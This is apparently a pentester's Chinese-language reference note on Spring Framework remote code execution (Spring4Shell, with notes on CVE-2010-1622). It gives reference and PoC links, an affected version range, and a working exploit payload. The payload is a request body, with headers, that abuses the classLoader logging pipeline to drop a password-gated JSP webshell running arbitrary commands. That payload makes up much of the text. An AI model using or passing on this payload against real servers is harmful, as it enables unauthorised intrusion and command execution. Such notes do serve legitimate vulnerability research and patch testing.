参考：
- [Spring 框架漏洞集合](https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/)
- [Spring 全家桶各类 RCE 漏洞浅析](https://paper.seebug.org/1422/#_3)
- [spring actuator restart logging.config rce](https://landgrey.me/blog/21/)
- https://github.com/LandGrey/SpringBootVulExploit
- [Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索](https://landgrey.me/blog/22/)
- [CVE-2021-22060: Additional Log Injection in Spring Framework (follow-up to CVE-2021-22096)](https://tanzu.vmware.com/security/cve-2021-22060)



## Spring RCE
影响范围：
-  [2.5,2.5.6.SEC02)

## PoC
- https://github.com/craig/SpringCore0day/blob/main/exp.py
- https://github.com/lunasec-io/Spring4Shell-POC/blob/master/exploit.py


```
    headers = {"suffix":"%>//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"

    }

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

### Ref
- [CVE-2010-1622: Spring Framework execution of arbitrary code](https://seclists.org/fulldisclosure/2010/Jun/456)
- [Spring Framework - Arbitrary code Execution](https://www.exploit-db.com/exploits/13918)
- [Spring Core RCE 0day｜文末报告附件](https://mp.weixin.qq.com/s/P-NEJzUUjIyemkSe_RbicQ)
- https://github.com/spring-projects/spring-framework/commit/7f7fb58dd0dae86d22268a4b59ac7c72a6c22529
